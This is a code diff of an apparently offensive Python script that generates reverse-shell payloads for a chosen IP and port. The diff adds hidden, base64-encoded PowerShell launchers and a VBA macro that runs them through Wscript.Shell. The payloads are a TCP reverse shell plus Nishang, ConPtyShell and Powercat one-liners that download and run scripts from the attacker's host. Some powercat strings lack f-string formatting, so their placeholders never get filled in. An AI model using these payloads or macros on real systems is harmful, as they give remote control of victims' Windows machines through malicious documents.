@@ -36,9 +36,7 @@ def build(payload):
 
 
 def macro(pay):
-
-    print("\n\n\n********** Powershell reverse shell base64 encoded Macro **********\n")
-        
+            
     size = chunk_size - 1
     chunks = [pay[i:i+size] for i in range(0, len(pay), size)]
             
@@ -59,7 +57,8 @@ def macro(pay):
         else:
             print(f"\tStr = Str + \"{chunk}\"")
 
-
+    print(f'\n\tCreateObject("Wscript.Shell").Run Str')
+    print(f'End Sub')
 
 def print_listener(port):
     print("\n********** Listener **********\n")
@@ -81,15 +80,16 @@ def print_tty():
 
 def print_powershell(ip, port, use_macro):
 
-    print("\n\n\n*******************************************************")
+    print("\n\n*******************************************************")
     print("                      PAYLOADS                    ")
     print("*******************************************************")
-    print("\n\n\n********** Powershell reverse shell oneliner **********\n")
+    print("\n\n********** Powershell reverse shell oneliner **********\n")
     text = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
     print(text)
     pay = build(text)
     
     if use_macro:
+        print("\n\n\n********** Powershell reverse shell base64 Macro **********\n")
         macro(pay)
     else:
         print("\n\n\n********** Powershell reverse shell base64 **********\n")
@@ -97,106 +97,113 @@ def print_powershell(ip, port, use_macro):
 
 
 
-def print_conpty(ip, port, rows, columns):
-    print("\n\n\n********** ConPtyShell RevShell **********\n")
-    print(f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")
+def print_conpty(ip, port, rows, columns, use_macro):
+    print("\n\n********** ConPtyShell RevShell **********\n")
+    payload = f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
+    print(payload)
 
-    print("\n********** ConPtyShell RevShell b64 **********\n")
-    payload = "Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
-   
+    print("\n********** ConPtyShell RevShell b64 **********\n")   
     p64 = build(payload)
-    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** ConPtyShell Download & IEX **********\n")
-    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')")
+    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')"
+    print(payload)
 
     print("\n********** ConPtyShell Download & IEX b64 **********\n")
-    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')"
-    
     p64 = build(payload)
-    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
-    print("\n********** ConPtyShell Download & Execution **********\n")
-    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")
-
-    print("\n********** ConPtyShell Download & Execution b64 **********\n")
-    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}" 
-    
+    print("\n********** ConPtyShell Download, IEX & Execution **********\n")
+    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
+    print(payload)
     p64 = build(payload)
-    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
-    print(f"powershell -nop -w hidden -enc {p64}")
+
+    if use_macro:
+        print("\n\n********** ConPTY reverse shell base64 Macro **********\n")
+        macro(p64)
+    else:
+        print("\n\n********** ConPtyShell Download, IEX & Execution base64 **********\n")
+        print(f"powershell -nop -w hidden -enc {p64}")
 
 
-def print_nishang(ip, port):
+    print(f"\n\n\n\tDONT'T FORGET !!")
+    print(f"\trlwrap -cAr nc -nlvp {port}")
+    print(f"\tpython3 -m uploadserver 80")
 
-    print("\n\n\n********** Nishang payload **********\n")
-    print(f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")
+
+def print_nishang(ip, port, use_macro):
+
+    print("\n\n********** Nishang payload **********\n")
+    payload = f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+    print(payload)
 
     print("\n********** Nishang payload b64**********\n")
-    payload = "Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
-   
     p64 = build(payload)
-    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** Nishang Download & IEX **********\n")
-    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1')")
+    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1')"
+    print(payload)
 
-    print("\n********** Nishang Download & IEX b64 **********\n")
-    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1')"
-    
+    print("\n********** Nishang Download & IEX b64 **********\n") 
     p64 = build(payload)
-    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** Nishang Download & Execution **********\n")
-    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")
-
-    print("\n********** Nishang Download & Execution b64 **********\n")
-    payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
-    
+    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
+    print(payload)
     p64 = build(payload)
-    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
-    print(f"powershell -nop -w hidden -enc {p64}")
+    
+    if use_macro:
+        print("\n\n********** Nishang reverse shell base64 Macro **********\n")
+        macro(p64)
+    else:
+        print("\n\n********** Nishang Download, IEX & Execution base64 **********\n")
+        print(f"powershell -nop -w hidden -enc {p64}")
 
 
+    print(f"\n\n\n\tDONT'T FORGET !!")
+    print(f"\trlwrap -cAr nc -nlvp {port}")
+    print(f"\tpython3 -m uploadserver 80")
 
-def print_powercat(ip, port):
+
+def print_powercat(ip, port, use_macro):
 
     
     print("\n\n\n********** PowerCat payload **********\n")
-    print(f"powercat -c {ip} -p {port} -e powershell")
+    payload = "powercat -c {ip} -p {port} -e powershell"
+    print(payload)
 
     print("\n********** PowerCat payload b64**********\n")
-    payload = "powercat -c {ip} -p {port} -e powershell"
-    
     p64 = build(payload)
-    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & IEX **********\n")
-    print(f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')")
+    payload = "IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')"
+    print(payload)
 
     print("\n********** PowerCat Download & IEX b64 **********\n")
-    payload = "IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')"
-    
     p64 = build(payload)
-    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & Execution **********\n")
-    print(f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell")
-
-    print("\n********** PowerCat Download & Execution b64 **********\n")
     payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell"
-    
+    print(payload)
     p64 = build(payload)
-    #p16 = payload.encode("utf-16le")[2:]
-    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
-    #print(f"{p16}")
-    print(f"powershell -nop -w hidden -enc {p64}")
+    print(p64)
+
+    if use_macro:
+        print("\n\n********** Powercat reverse shell base64 Macro **********\n")
+        macro(p64)
+    else:
+        print("\n\n********** Powercat Download, IEX & Execution base64 **********\n")
+        print(f"powershell -nop -w hidden -enc {p64}")
+
+
+    print(f"\n\n\n\tDONT'T FORGET !!")
+    print(f"\trlwrap -cAr nc -nlvp {port}")
+    print(f"\tpython3 -m uploadserver 80")
 
 
 def print_perl():
@@ -266,8 +273,15 @@ def print_nc(ip, port):
 
 def main(use_macro):
     if len(sys.argv) < 4:
-        print("Usage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
+        print("\n\tUsage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
         print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-powercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
+        print(f"\t--macro provides a base64 powershell payload ready to load as a macro, this option can only be used with -powercat, -nishang, -powershell, or -conpty.")
+        print("\nExamples:\n")
+        print(f"\tshell 192.168.1.72 4444 -php")
+        print(f"\tshell 192.168.1.72 4444 -powershell")
+        print(f"\tshell 192.168.1.72 4444 -nishang --macro")
+        print(f"\tshell 192.168.1.72 4444 -conpty 54 118")
+
         sys.exit(1)
 
     ip = sys.argv[1]
@@ -307,11 +321,11 @@ def main(use_macro):
         print(use_macro)
         print_powershell(ip, port, use_macro)
     elif shell_type == "-powercat":
-        print_powercat(ip, port)
+        print_powercat(ip, port, use_macro)
     elif shell_type == "-nishang":
-        print_nishang(ip, port)
+        print_nishang(ip, port, use_macro)
     elif shell_type == "-conpty":
-        print_conpty(ip, port, rows, cols)
+        print_conpty(ip, port, rows, cols, use_macro)
     elif shell_type == "-php":
         print_php(ip, port)
     elif shell_type == "-bash":
@@ -322,9 +336,6 @@ def main(use_macro):
         print_nc(ip, port)
     else:
         print(f"Shell type '{shell_type}' not recognized.")
-
-
-
 
 if __name__ == "__main__":
     
